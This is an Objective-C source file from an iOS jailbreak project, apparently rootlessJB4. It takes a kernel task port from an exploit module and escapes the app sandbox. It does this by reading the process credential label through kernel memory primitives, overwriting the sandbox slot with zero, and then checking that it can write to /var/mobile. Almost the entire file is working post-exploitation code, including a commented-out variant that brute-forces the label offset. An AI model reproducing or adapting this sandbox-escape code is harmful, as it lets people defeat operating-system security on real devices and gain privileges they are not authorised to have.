//
//  everythingElse.c
//  rootlessJB4
//
//  Created by Brandon Plank on 8/28/19.
//  Copyright © 2019 Brandon Plank. All rights reserved.
//

#import <Foundation/Foundation.h>

#import <UIKit/UIKit.h>

#include "everythingElse.h"
#include "exploit.h"
#include "offsets.h"
#include "kernel_memory.h"


#define LOG(string, args...) do {\
printf(string "\n", ##args); \
} while (0)

mach_port_t tfp0;
uint64_t kbase;
uint64_t task_self_addr_cache;
uint64_t selfproc_cached;

void time_waste() {
    tfp0 = get_tfp0();
}


bool runExploit(void *init)
{
    time_waste();
    if (tfp0 != 0x0){
        return true;
    }
    return false;
}

bool escapeSandbox()
{
    // 00 00 00 00 00 | No Sandbox
    // 01 00 00 00 00 | Sandbox
    
    /*
    uint64_t our_task = find_self_task();
    LOG("[*] our_task: 0x%llx", our_task);
        // find the sandbox slot
    uint64_t proc = rk64(our_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    LOG("[*] our_proc: 0x%llx", proc);
    uint64_t our_ucred = rk64(proc + 0x100); // 0x100 - off_p_ucred
    LOG("[*] ucred: 0x%llx", our_ucred);
    uint64_t cr_label = rk64(our_ucred + 0x78); // 0x78 - off_ucred_cr_label
    //eh, brute forcing works owo
    int i = 1;
    bool running = true;
    if (cr_label == 0x0) {
        while (running) {
            cr_label = rk64(our_ucred + i);
            i++;
            if (cr_label != 0x0){
                printf("took %d time\n", i);
                running = false;
            }
        }
    }
    LOG("[*] cr_label: 0x%llx", cr_label);
    uint64_t sandbox = rk64(cr_label + 0x10);
    LOG("[*] sandbox_slot: 0x%llx", sandbox);
    
    LOG("[*] Setting sandbox_slot to 0");
        // Set sandbox pointer to 0;
    wk64(cr_label + 0x10, 0);
     */
    
    LOG("[*] selfproc: 0x%016llx", selfproc_cached);
    
    uint64_t ucred = rk64(selfproc_cached + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    LOG("[*] ucred: 0x%016llx", ucred);
    uint64_t cr_label = rk64(ucred + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL));
    LOG("[*] cr_label: 0x%016llx", cr_label);
    uint64_t sandbox_addr = cr_label + 0x8 + 0x8;
    LOG("[*] sandbox_addr: 0x%016llx", sandbox_addr);
    wk64(sandbox_addr, (uint64_t) 0);
    
    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/test_jb" contents:NULL attributes:nil];
    if ([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/test_jb"])
    {
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/test_jb" error:nil];
        return true;
    } else {
        return false;
    }
    
}
